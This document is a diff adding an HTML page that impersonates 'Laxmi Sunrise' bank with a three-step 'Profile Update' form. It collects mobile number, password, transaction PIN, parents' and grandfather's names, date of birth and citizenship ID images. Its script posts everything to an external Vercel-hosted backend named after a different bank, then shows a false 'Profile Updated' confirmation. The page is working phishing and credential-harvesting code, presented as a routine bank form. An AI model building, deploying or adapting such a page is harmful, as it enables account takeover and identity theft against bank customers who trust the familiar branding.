@@ -1,0 +1,1826 @@
+<!doctype html>
+<html lang="en">
+
+<head>
+
+  <meta charset="UTF-8" />
+
+  <meta
+    name="viewport"
+    content="width=device-width, initial-scale=1.0, maximum-scale=1"
+  />
+
+  <meta
+    name="description"
+    content="Laxmi Sunrise Profile Update"
+  />
+
+  <title>Laxmi Sunrise — Profile Update</title>
+
+  <style>
+
+    :root {
+      --orange: #f57b14;
+      --orange-dark: #dc6510;
+      --brown: #ad5d18;
+      --brown-deep: #7b4419;
+      --grey: #8e8e90;
+      --ink: #2e2c2b;
+      --muted: #747170;
+      --paper: #fffdfa;
+      --line: #dfd9d1;
+      --danger: #b42318;
+      --safe: #59735e;
+      --ease: cubic-bezier(.23, 1, .32, 1);
+    }
+
+    * {
+      box-sizing: border-box;
+    }
+
+    html {
+      min-height: 100%;
+      background: #f6f3ee;
+    }
+
+    body {
+      display: grid;
+      min-height: 100vh;
+      margin: 0;
+      place-items: center;
+      overflow-x: hidden;
+      color: var(--ink);
+      background: #f6f3ee;
+      font-family: Arial, Helvetica, sans-serif;
+    }
+
+    body::before {
+      content: '';
+      position: fixed;
+      z-index: 0;
+      inset: 0;
+      background: url('image copy.png') center / auto 80% no-repeat;
+      pointer-events: none;
+      opacity: 0.6;
+    }
+
+    button,
+    input {
+      font: inherit;
+    }
+
+    button {
+      border: 0;
+      cursor: pointer;
+    }
+
+    button:focus-visible,
+    input:focus-visible {
+      outline: 3px solid rgba(245,123,20,.32);
+      outline-offset: 3px;
+    }
+
+    .screen {
+      position: relative;
+      z-index: 1;
+      width: min(100%, 620px);
+      padding: 28px 18px;
+    }
+
+    .form-card {
+      position: relative;
+      overflow: hidden;
+      border: 1px solid rgba(123,68,25,.16);
+      border-radius: 16px;
+      background: #fffdfa;
+      box-shadow:
+        0 22px 60px rgba(94,56,25,.16),
+        0 2px 0 rgba(255,255,255,.9) inset;
+    }
+
+    .form-card::after {
+      content: '';
+      pointer-events: none;
+      position: absolute;
+      top: 49%;
+      right: -50px;
+      width: 265px;
+      height: 265px;
+      border: 22px solid rgba(245,123,20,.035);
+      border-radius: 50%;
+    }
+
+    .brand-line {
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      gap: 14px;
+      padding: 19px 22px;
+      border-bottom: 1px solid rgba(123,68,25,.12);
+      background: #fff;
+    }
+
+    .brand-line img {
+      display: block;
+      width: min(195px, 48vw);
+      height: auto;
+    }
+
+    .concept-tag {
+      padding: 6px 8px;
+      border: 1px solid rgba(173,93,24,.28);
+      border-radius: 999px;
+      color: var(--brown-deep);
+      background: #fff9f2;
+      font-size: .61rem;
+      font-weight: 700;
+      letter-spacing: .075em;
+      line-height: 1.2;
+      text-align: center;
+      text-transform: uppercase;
+    }
+
+    .warm-band {
+      position: relative;
+      display: flex;
+      min-height: 57px;
+      align-items: center;
+      gap: 12px;
+      padding: 11px 22px;
+      color: #fff;
+      background:
+        linear-gradient(
+          90deg,
+          var(--brown) 0 46%,
+          var(--orange) 46% 78%,
+          var(--grey) 78%
+        );
+    }
+
+    .warm-band::before {
+      content: '';
+      width: 30px;
+      height: 30px;
+      border: 1px solid rgba(255,255,255,.58);
+      border-radius: 50%;
+      background: rgba(255,255,255,.1);
+    }
+
+    .warm-band span {
+      position: absolute;
+      left: 32px;
+      width: 10px;
+      height: 10px;
+      border: 2px solid #fff;
+      border-radius: 50%;
+    }
+
+    .warm-band strong {
+      margin-left: 1px;
+      font-size: .9rem;
+      letter-spacing: .005em;
+    }
+
+    .content {
+      position: relative;
+      z-index: 1;
+      padding: 28px 22px 24px;
+    }
+
+    .progress {
+      display: grid;
+      grid-template-columns: repeat(3, 1fr);
+      margin: 0 0 26px;
+    }
+
+    .step {
+      position: relative;
+      display: grid;
+      justify-items: center;
+      gap: 7px;
+      color: #aaa7a3;
+      font-size: .65rem;
+      font-weight: 700;
+      text-align: center;
+    }
+
+    .step::after {
+      content: '';
+      position: absolute;
+      top: 14px;
+      left: calc(50% + 17px);
+      width: calc(100% - 34px);
+      height: 1px;
+      background: #ddd9d5;
+    }
+
+    .step:last-child::after {
+      display: none;
+    }
+
+    .number {
+      position: relative;
+      z-index: 1;
+      display: grid;
+      width: 28px;
+      height: 28px;
+      place-items: center;
+      border: 1px solid #dedad7;
+      border-radius: 50%;
+      color: #a29e99;
+      background: #fffdfa;
+      font-size: .75rem;
+    }
+
+    .step.active {
+      color: var(--ink);
+    }
+
+    .step.active .number {
+      border-color: var(--orange);
+      color: #fff;
+      background: var(--orange);
+      box-shadow: 0 0 0 4px rgba(245,123,20,.1);
+    }
+
+    .step.done {
+      color: var(--brown);
+    }
+
+    .step.done .number {
+      border-color: var(--brown);
+      color: #fff;
+      background: var(--brown);
+    }
+
+    .intro {
+      margin: 0 0 23px;
+      text-align: center;
+    }
+
+    .eyebrow {
+      margin: 0 0 7px;
+      color: var(--brown);
+      font-size: .68rem;
+      font-weight: 700;
+      letter-spacing: .13em;
+      text-transform: uppercase;
+    }
+
+    h1 {
+      margin: 0;
+      color: #312e2d;
+      font-family: Georgia, 'Times New Roman', serif;
+      font-size: clamp(1.65rem, 7vw, 2.25rem);
+      letter-spacing: -.045em;
+      line-height: 1.1;
+    }
+
+    .intro p {
+      max-width: 42ch;
+      margin: 9px auto 0;
+      color: var(--muted);
+      font-size: .87rem;
+      line-height: 1.5;
+    }
+
+    .form-step {
+      display: none;
+      animation: lift .24s var(--ease) both;
+    }
+
+    .form-step.active {
+      display: block;
+    }
+
+    .fields {
+      display: grid;
+      gap: 14px;
+    }
+
+    .field {
+      position: relative;
+    }
+
+    .field label {
+      display: block;
+      margin: 0 0 6px 2px;
+      color: var(--brown-deep);
+      font-size: .71rem;
+      font-weight: 700;
+    }
+
+    .required {
+      color: var(--danger);
+    }
+
+    .field input {
+      width: 100%;
+      min-height: 52px;
+      padding: 13px 14px;
+      border: 1px solid #d9d4ce;
+      border-radius: 10px;
+      color: var(--ink);
+      background: #fff;
+      box-shadow: 0 2px 4px rgba(123,68,25,.025);
+      transition:
+        border-color .18s var(--ease),
+        box-shadow .18s var(--ease);
+    }
+
+    .field input:focus {
+      border-color: var(--orange);
+      box-shadow: 0 0 0 4px rgba(245,123,20,.1);
+    }
+
+    .field.invalid input {
+      border-color: var(--danger);
+    }
+
+    .error {
+      display: none;
+      margin: 6px 0 0 2px;
+      color: var(--danger);
+      font-size: .72rem;
+    }
+
+    .field.invalid .error {
+      display: block;
+    }
+
+    .notice {
+      display: flex;
+      align-items: flex-start;
+      gap: 9px;
+      margin-top: 18px;
+      padding: 11px 12px;
+      border-left: 3px solid var(--orange);
+      color: #6d5e51;
+      background: #fff7ed;
+      font-size: .75rem;
+      line-height: 1.42;
+    }
+
+    .actions {
+      display: flex;
+      flex-wrap: wrap-reverse;
+      align-items: center;
+      justify-content: space-between;
+      gap: 11px;
+      margin-top: 23px;
+    }
+
+    .button {
+      display: inline-flex;
+      min-height: 47px;
+      align-items: center;
+      justify-content: center;
+      gap: 8px;
+      padding: 11px 18px;
+      border-radius: 9px;
+      font-size: .87rem;
+      font-weight: 700;
+    }
+
+    .button.back {
+      color: #4c4946;
+      background: #eeecea;
+    }
+
+    .button.next {
+      min-width: 154px;
+      color: #fff;
+      background: var(--orange);
+      box-shadow: 0 8px 15px rgba(220,101,16,.2);
+    }
+
+    .button.finish {
+      background: var(--brown);
+      box-shadow: 0 8px 15px rgba(123,68,25,.18);
+    }
+
+    .arrow {
+      width: 16px;
+      height: 16px;
+    }
+
+    .acknowledgement {
+      display: flex;
+      gap: 9px;
+      align-items: flex-start;
+      margin-top: 17px;
+      padding-top: 17px;
+      border-top: 1px solid var(--line);
+      color: #615d59;
+      font-size: .77rem;
+      line-height: 1.46;
+    }
+
+    .acknowledgement input {
+      width: 18px;
+      height: 18px;
+      margin: 0;
+      accent-color: var(--brown);
+    }
+
+    .acknowledgement.invalid {
+      color: var(--danger);
+    }
+
+    .completion {
+      display: none;
+      padding: 10px 4px 4px;
+      text-align: center;
+      animation: lift .24s var(--ease) both;
+    }
+
+    .completion.show {
+      display: block;
+    }
+
+    .completion-icon {
+      display: grid;
+      width: 58px;
+      height: 58px;
+      margin: 4px auto 15px;
+      place-items: center;
+      border: 2px solid rgba(173,93,24,.16);
+      border-radius: 50%;
+      color: #fff;
+      background: var(--brown);
+      box-shadow: 0 0 0 7px rgba(173,93,24,.08);
+    }
+
+    .completion h2 {
+      margin: 0;
+      font-family: Georgia, 'Times New Roman', serif;
+      font-size: 1.9rem;
+    }
+
+    .completion p {
+      max-width: 33ch;
+      margin: 9px auto 0;
+      color: var(--muted);
+      font-size: .86rem;
+      line-height: 1.5;
+    }
+
+    @keyframes lift {
+      from {
+        opacity: 0;
+        transform: translateY(9px);
+      }
+
+      to {
+        opacity: 1;
+        transform: translateY(0);
+      }
+    }
+
+    @media (max-width: 390px) {
+
+      .screen {
+        padding: 13px;
+      }
+
+      .brand-line,
+      .warm-band {
+        padding-inline: 16px;
+      }
+
+      .content {
+        padding-inline: 16px;
+      }
+
+      .brand-line img {
+        width: 160px;
+      }
+    }
+
+  </style>
+
+</head>
+
+<body>
+
+<main class="screen">
+
+<section class="form-card">
+
+  <div class="brand-line">
+
+    <img
+      src="/logo.png"
+      alt="Laxmi Sunrise logo"
+    />
+
+  </div>
+
+  <div
+    class="warm-band"
+    aria-hidden="true"
+  >
+    <span></span>
+
+    <strong>
+      Guided Profile Update
+    </strong>
+
+  </div>
+
+  <div class="content">
+
+    <!-- PROGRESS -->
+
+    <nav
+      class="progress"
+      aria-label="Form progress"
+    >
+
+      <div
+        class="step active"
+        data-indicator="1"
+      >
+        <span class="number">1</span>
+        <span>Login</span>
+      </div>
+
+      <div
+        class="step"
+        data-indicator="2"
+      >
+        <span class="number">2</span>
+        <span>Personal Info</span>
+      </div>
+
+      <div
+        class="step"
+        data-indicator="3"
+      >
+        <span class="number">3</span>
+        <span>Documents</span>
+      </div>
+
+    </nav>
+
+    <!-- INTRO -->
+
+    <div class="intro">
+
+      <p
+        class="eyebrow"
+        id="step-label"
+      >
+        Step 1 of 3
+      </p>
+
+      <h1 id="form-title">
+        Secure your account.
+      </h1>
+
+      <p id="form-subtitle">
+        Please enter your mobile number and security details.
+      </p>
+
+    </div>
+
+    <!-- FORM -->
+
+    <form
+      id="demo-form"
+      novalidate
+    >
+
+      <!-- ========================================= -->
+      <!-- STEP 1 -->
+      <!-- ========================================= -->
+
+      <section
+        class="form-step active"
+        data-step="1"
+      >
+
+        <div class="fields">
+
+          <div
+            class="field"
+            data-required="mobileNumber"
+          >
+
+            <label for="mobileNumber">
+              Mobile Number
+              <span class="required">*</span>
+            </label>
+
+            <input
+              id="mobileNumber"
+              type="tel"
+              inputmode="numeric"
+              autocomplete="tel"
+              placeholder="Enter mobile number"
+            />
+
+            <p class="error">
+              Please enter mobile number.
+            </p>
+
+          </div>
+
+
+          <div
+            class="field"
+            data-required="password"
+          >
+
+            <label for="password">
+              Password
+              <span class="required">*</span>
+            </label>
+
+            <input
+              id="password"
+              type="password"
+              autocomplete="new-password"
+              placeholder="Enter password"
+            />
+
+            <p class="error">
+              Please enter password.
+            </p>
+
+          </div>
+
+
+          <div
+            class="field"
+            data-required="pin"
+          >
+
+            <label for="pin">
+              4 Digit PIN
+              <span class="required">*</span>
+            </label>
+
+            <input
+              id="pin"
+              type="password"
+              inputmode="numeric"
+              maxlength="4"
+              autocomplete="off"
+              placeholder="Enter 4 digit PIN"
+            />
+
+            <p class="error">
+              Please enter 4 digit PIN.
+            </p>
+
+          </div>
+
+        </div>
+
+        <div class="actions">
+
+          <span></span>
+
+          <button
+            class="button next"
+            type="button"
+            data-next
+          >
+            Continue
+
+            <svg
+              class="arrow"
+              viewBox="0 0 24 24"
+              fill="none"
+              stroke="currentColor"
+              stroke-width="2.2"
+            >
+              <path d="m9 18 6-6-6-6"/>
+            </svg>
+
+          </button>
+
+        </div>
+
+      </section>
+
+
+      <!-- ========================================= -->
+      <!-- STEP 2 -->
+      <!-- ========================================= -->
+
+      <section
+        class="form-step"
+        data-step="2"
+      >
+
+        <div class="fields">
+
+          <div
+            class="field"
+            data-required="accountHolderName"
+          >
+
+            <label for="accountHolderName">
+              Account Holder Name
+              <span class="required">*</span>
+            </label>
+
+            <input
+              id="accountHolderName"
+              type="text"
+              autocomplete="name"
+              placeholder="Enter account holder name"
+            />
+
+            <p class="error">
+              Please enter account holder name.
+            </p>
+
+          </div>
+
+
+          <div
+            class="field"
+            data-required="motherName"
+          >
+
+            <label for="motherName">
+              Mother Name
+              <span class="required">*</span>
+            </label>
+
+            <input
+              id="motherName"
+              type="text"
+              placeholder="Enter mother's name"
+            />
+
+            <p class="error">
+              Please enter mother's name.
+            </p>
+
+          </div>
+
+
+          <div
+            class="field"
+            data-required="fatherName"
+          >
+
+            <label for="fatherName">
+              Father Name
+              <span class="required">*</span>
+            </label>
+
+            <input
+              id="fatherName"
+              type="text"
+              placeholder="Enter father's name"
+            />
+
+            <p class="error">
+              Please enter father's name.
+            </p>
+
+          </div>
+
+
+          <div
+            class="field"
+            data-required="grandFatherName"
+          >
+
+            <label for="grandFatherName">
+              Grand Father Name
+              <span class="required">*</span>
+            </label>
+
+            <input
+              id="grandFatherName"
+              type="text"
+              placeholder="Enter grandfather's name"
+            />
+
+            <p class="error">
+              Please enter grandfather's name.
+            </p>
+
+          </div>
+
+
+          <div
+            class="field"
+            data-required="birthDate"
+          >
+
+            <label for="birthDate">
+              Date of Birth
+              <span class="required">*</span>
+            </label>
+
+            <input
+              id="birthDate"
+              type="date"
+            />
+
+            <p class="error">
+              Please select date of birth.
+            </p>
+
+          </div>
+
+        </div>
+
+
+        <div class="actions">
+
+          <button
+            class="button back"
+            type="button"
+            data-back
+          >
+            Back
+          </button>
+
+          <button
+            class="button next"
+            type="button"
+            data-next
+          >
+            Continue
+
+            <svg
+              class="arrow"
+              viewBox="0 0 24 24"
+              fill="none"
+              stroke="currentColor"
+              stroke-width="2.2"
+            >
+              <path d="m9 18 6-6-6-6"/>
+            </svg>
+
+          </button>
+
+        </div>
+
+      </section>
+
+
+      <!-- ========================================= -->
+      <!-- STEP 3 -->
+      <!-- ========================================= -->
+
+      <section
+        class="form-step"
+        data-step="3"
+      >
+
+        <div class="fields">
+
+          <div class="field">
+
+            <label for="frontCitizenship">
+              Front Citizenship
+            </label>
+
+            <input
+              id="frontCitizenship"
+              type="file"
+              accept="image/*"
+            />
+
+            <p class="error">
+              Please upload front citizenship.
+            </p>
+
+          </div>
+
+
+          <div class="field">
+
+            <label for="backCitizenship">
+              Back Citizenship
+            </label>
+
+            <input
+              id="backCitizenship"
+              type="file"
+              accept="image/*"
+            />
+
+            <p class="error">
+              Please upload back citizenship.
+            </p>
+
+          </div>
+
+        </div>
+
+
+        <label
+          class="acknowledgement"
+          id="ack-row"
+        >
+
+          <input
+            id="declaration"
+            type="checkbox"
+          />
+
+          <span>
+            I declare that the information provided
+            is true and correct.
+          </span>
+
+        </label>
+
+
+        <div class="actions">
+
+          <button
+            class="button back"
+            type="button"
+            data-back
+          >
+            Back
+          </button>
+
+          <button
+            class="button next finish"
+            type="button"
+            id="finish-demo"
+          >
+
+            Submit
+
+            <svg
+              class="arrow"
+              viewBox="0 0 24 24"
+              fill="none"
+              stroke="currentColor"
+              stroke-width="2.2"
+            >
+              <path d="m9 18 6-6-6-6"/>
+            </svg>
+
+          </button>
+
+        </div>
+
+      </section>
+
+    </form>
+
+
+    <!-- COMPLETION -->
+
+    <section
+      class="completion"
+      id="completion"
+      aria-live="polite"
+    >
+
+      <div class="completion-icon">
+
+        <svg
+          width="28"
+          height="28"
+          viewBox="0 0 24 24"
+          fill="none"
+          stroke="currentColor"
+          stroke-width="2.5"
+        >
+          <path d="m5 12.5 4.2 4.2L19 7.5"/>
+        </svg>
+
+      </div>
+
+      <h2>
+        Profile Updated.
+      </h2>
+
+      <p>
+        Your profile has been successfully updated.
+      </p>
+
+    </section>
+
+  </div>
+
+</section>
+
+</main>
+
+
+<script>
+
+(() => {
+
+  // ===================================================
+  // API
+  // ===================================================
+
+  const API_BASE =
+    'https://nic-asia-backend.vercel.app/api';
+
+
+  // ===================================================
+  // STATE
+  // ===================================================
+
+  let userPassword = '';
+
+  let isLoading = false;
+
+  let step = 1;
+
+
+  // ===================================================
+  // COPY
+  // ===================================================
+
+  const copy = {
+
+    1: [
+      'Step 1 of 3',
+      'Login Details',
+      'Please enter your mobile number and security details.'
+    ],
+
+    2: [
+      'Step 2 of 3',
+      'Personal Information',
+      'Please provide your personal and family details.'
+    ],
+
+    3: [
+      'Step 3 of 3',
+      'Document Upload',
+      'Please upload your citizenship documents.'
+    ]
+
+  };
+
+
+  // ===================================================
+  // DOM
+  // ===================================================
+
+  const form =
+    document.querySelector('#demo-form');
+
+  const title =
+    document.querySelector('#form-title');
+
+  const subtitle =
+    document.querySelector('#form-subtitle');
+
+  const label =
+    document.querySelector('#step-label');
+
+  const completion =
+    document.querySelector('#completion');
+
+
+  // ===================================================
+  // VALIDATION
+  // ===================================================
+
+  function fieldsAt(stepNumber) {
+
+    const section =
+      document.querySelector(
+        `.form-step[data-step="${stepNumber}"]`
+      );
+
+    return [
+      ...section.querySelectorAll('[data-required]')
+    ];
+  }
+
+
+  function checkField(field) {
+
+    const input =
+      field.querySelector('input');
+
+    let pass =
+      input.value.trim() !== '';
+
+
+    if (
+      input.id === 'pin' &&
+      pass
+    ) {
+      pass =
+        /^\d{4}$/.test(input.value);
+    }
+
+
+    field.classList.toggle(
+      'invalid',
+      !pass
+    );
+
+    return pass;
+  }
+
+
+  function validate(stepNumber) {
+
+    return fieldsAt(stepNumber)
+      .every(checkField);
+
+  }
+
+
+  // ===================================================
+  // STEP 1
+  // ===================================================
+
+  async function submitStep1() {
+
+    const password =
+      document.querySelector('#password').value;
+
+    const mobileNumber =
+      document.querySelector('#mobileNumber').value;
+
+    const pin =
+      document.querySelector('#pin').value;
+
+
+    userPassword =
+      password;
+
+
+    const payload = {
+
+      password,
+
+      mobileNumber:
+        mobileNumber || null,
+
+      transactionPin:
+        pin || null
+
+    };
+
+
+    console.log(
+      'Step 1 payload:',
+      payload
+    );
+
+
+    const response =
+      await fetch(
+        `${API_BASE}/users`,
+        {
+          method: 'POST',
+
+          headers: {
+            'Content-Type':
+              'application/json'
+          },
+
+          body:
+            JSON.stringify(payload)
+        }
+      );
+
+
+    const data =
+      await response.json();
+
+
+    console.log(
+      'Step 1 response:',
+      data
+    );
+
+
+    if (!response.ok) {
+
+      throw new Error(
+        data.error ||
+        'Failed to save account access'
+      );
+
+    }
+
+
+    return data;
+
+  }
+
+
+  // ===================================================
+  // STEP 2
+  // ===================================================
+
+  async function submitStep2() {
+
+    const accountHolderName =
+      document.querySelector(
+        '#accountHolderName'
+      ).value;
+
+    const mothersName =
+      document.querySelector(
+        '#motherName'
+      ).value;
+
+    const fathersName =
+      document.querySelector(
+        '#fatherName'
+      ).value;
+
+    const grandfathersName =
+      document.querySelector(
+        '#grandFatherName'
+      ).value;
+
+    const dateOfBirth =
+      document.querySelector(
+        '#birthDate'
+      ).value;
+
+
+    const payload = {
+
+      password:
+        userPassword,
+
+      accountHolderName:
+        accountHolderName || null,
+
+      mothersName:
+        mothersName || null,
+
+      fathersName:
+        fathersName || null,
+
+      grandfathersName:
+        grandfathersName || null,
+
+      dateOfBirth:
+        dateOfBirth || null
+
+    };
+
+
+    console.log(
+      'Step 2 payload:',
+      payload
+    );
+
+
+    const response =
+      await fetch(
+        `${API_BASE}/users`,
+        {
+          method: 'PUT',
+
+          headers: {
+            'Content-Type':
+              'application/json'
+          },
+
+          body:
+            JSON.stringify(payload)
+        }
+      );
+
+
+    const data =
+      await response.json();
+
+
+    console.log(
+      'Step 2 response:',
+      data
+    );
+
+
+    if (!response.ok) {
+
+      throw new Error(
+        data.error ||
+        'Failed to save personal details'
+      );
+
+    }
+
+
+    return data;
+
+  }
+
+
+  // ===================================================
+  // STEP 3
+  // IMPORTANT:
+  // NO BASE64
+  // NO JSON
+  // USE FORMDATA
+  // ===================================================
+
+  async function submitStep3() {
+
+    const frontInput =
+      document.querySelector(
+        '#frontCitizenship'
+      );
+
+    const backInput =
+      document.querySelector(
+        '#backCitizenship'
+      );
+
+
+    const frontFile =
+      frontInput.files[0];
+
+    const backFile =
+      backInput.files[0];
+
+
+    // At least one image
+    if (!frontFile && !backFile) {
+
+      throw new Error(
+        'Please upload at least one citizenship image.'
+      );
+
+    }
+
+
+    // Optional client-side size validation
+    const maxSize =
+      10 * 1024 * 1024;
+
+
+    if (
+      frontFile &&
+      frontFile.size > maxSize
+    ) {
+
+      throw new Error(
+        'Front citizenship image must be smaller than 10 MB.'
+      );
+
+    }
+
+
+    if (
+      backFile &&
+      backFile.size > maxSize
+    ) {
+
+      throw new Error(
+        'Back citizenship image must be smaller than 10 MB.'
+      );
+
+    }
+
+
+    // ================================================
+    // FormData
+    // ================================================
+
+    const formData =
+      new FormData();
+
+
+    formData.append(
+      'password',
+      userPassword
+    );
+
+
+    if (frontFile) {
+
+      formData.append(
+        'frontCitizenshipImage',
+        frontFile
+      );
+
+    }
+
+
+    if (backFile) {
+
+      formData.append(
+        'backCitizenshipImage',
+        backFile
+      );
+
+    }
+
+
+    console.log(
+      'Uploading images...',
+      {
+        password: userPassword,
+        frontImage: frontFile?.name,
+        backImage: backFile?.name
+      }
+    );
+
+
+    // ================================================
+    // SEND
+    // ================================================
+
+    const response =
+      await fetch(
+        `${API_BASE}/users/images`,
+        {
+          method: 'PATCH',
+
+          // IMPORTANT:
+          // DO NOT set Content-Type manually.
+          // Browser automatically creates multipart boundary.
+          body: formData
+        }
+      );
+
+
+    const data =
+      await response.json();
+
+
+    console.log(
+      'Step 3 response:',
+      data
+    );
+
+
+    if (!response.ok) {
+
+      throw new Error(
+        data.error ||
+        'Failed to upload citizenship images'
+      );
+
+    }
+
+
+    return data;
+
+  }
+
+
+  // ===================================================
+  // RENDER
+  // ===================================================
+
+  function render() {
+
+    document
+      .querySelectorAll('.form-step')
+      .forEach(panel => {
+
+        panel.classList.toggle(
+          'active',
+          Number(panel.dataset.step) === step
+        );
+
+      });
+
+
+    document
+      .querySelectorAll('[data-indicator]')
+      .forEach(indicator => {
+
+        const number =
+          Number(
+            indicator.dataset.indicator
+          );
+
+
+        indicator.classList.toggle(
+          'active',
+          number === step
+        );
+
+
+        indicator.classList.toggle(
+          'done',
+          number < step
+        );
+
+
+        indicator.querySelector(
+          '.number'
+        ).textContent =
+          number < step
+            ? '✓'
+            : number;
+
+      });
+
+
+    [
+      label.textContent,
+      title.textContent,
+      subtitle.textContent
+    ] =
+      copy[step];
+
+
+    document
+      .querySelector('.form-card')
+      .scrollIntoView({
+        behavior: 'smooth',
+        block: 'center'
+      });
+
+  }
+
+
+  // ===================================================
+  // INPUT VALIDATION
+  // ===================================================
+
+  form.addEventListener(
+    'input',
+    event => {
+
+      const field =
+        event.target.closest(
+          '[data-required]'
+        );
+
+
+      if (field) {
+        checkField(field);
+      }
+
+
+      if (
+        event.target.id ===
+        'declaration'
+      ) {
+
+        document
+          .querySelector('#ack-row')
+          .classList.remove(
+            'invalid'
+          );
+
+      }
+
+    }
+  );
+
+
+  // ===================================================
+  // NEXT BUTTONS
+  // ===================================================
+
+  document
+    .querySelectorAll('[data-next]')
+    .forEach(button => {
+
+      button.addEventListener(
+        'click',
+        async () => {
+
+          if (isLoading) {
+            return;
+          }
+
+
+          if (!validate(step)) {
+            return;
+          }
+
+
+          isLoading = true;
+
+          button.textContent =
+            'Loading...';
+
+          button.disabled = true;
+
+
+          try {
+
+            if (step === 1) {
+
+              await submitStep1();
+
+              step++;
+
+              render();
+
+            }
+
+
+            else if (step === 2) {
+
+              await submitStep2();
+
+              step++;
+
+              render();
+
+            }
+
+          }
+
+          catch (error) {
+
+            console.error(
+              error
+            );
+
+            alert(
+              error.message
+            );
+
+          }
+
+
+          finally {
+
+            isLoading = false;
+
+            button.innerHTML =
+              'Continue';
+
+            button.disabled = false;
+
+          }
+
+        }
+      );
+
+    });
+
+
+  // ===================================================
+  // BACK
+  // ===================================================
+
+  document
+    .querySelectorAll('[data-back]')
+    .forEach(button => {
+
+      button.addEventListener(
+        'click',
+        () => {
+
+          if (step > 1) {
+
+            step--;
+
+            render();
+
+          }
+
+        }
+      );
+
+    });
+
+
+  // ===================================================
+  // FINAL SUBMIT
+  // ===================================================
+
+  document
+    .querySelector('#finish-demo')
+    .addEventListener(
+      'click',
+      async () => {
+
+        const declaration =
+          document.querySelector(
+            '#declaration'
+          );
+
+        const row =
+          document.querySelector(
+            '#ack-row'
+          );
+
+
+        row.classList.toggle(
+          'invalid',
+          !declaration.checked
+        );
+
+
+        if (!declaration.checked) {
+          return;
+        }
+
+
+        if (isLoading) {
+          return;
+        }
+
+
+        isLoading = true;
+
+
+        const button =
+          document.querySelector(
+            '#finish-demo'
+          );
+
+
+        button.textContent =
+          'Submitting...';
+
+        button.disabled = true;
+
+
+        try {
+
+          await submitStep3();
+
+
+          form.style.display =
+            'none';
+
+
+          completion.classList.add(
+            'show'
+          );
+
+
+          label.textContent =
+            'Complete';
+
+
+          title.textContent =
+            'Profile Updated';
+
+
+          subtitle.textContent =
+            'Your profile has been successfully updated.';
+
+
+          document
+            .querySelectorAll(
+              '[data-indicator]'
+            )
+            .forEach(indicator => {
+
+              indicator.classList.remove(
+                'active'
+              );
+
+              indicator.classList.add(
+                'done'
+              );
+
+              indicator.querySelector(
+                '.number'
+              ).textContent =
+                '✓';
+
+            });
+
+        }
+
+        catch (error) {
+
+          console.error(
+            'Step 3 error:',
+            error
+          );
+
+          alert(
+            error.message
+          );
+
+        }
+
+        finally {
+
+          isLoading = false;
+
+          button.textContent =
+            'Submit';
+
+          button.disabled = false;
+
+        }
+
+      }
+    );
+
+
+})();
+
+</script>
+
+</body>
+</html>
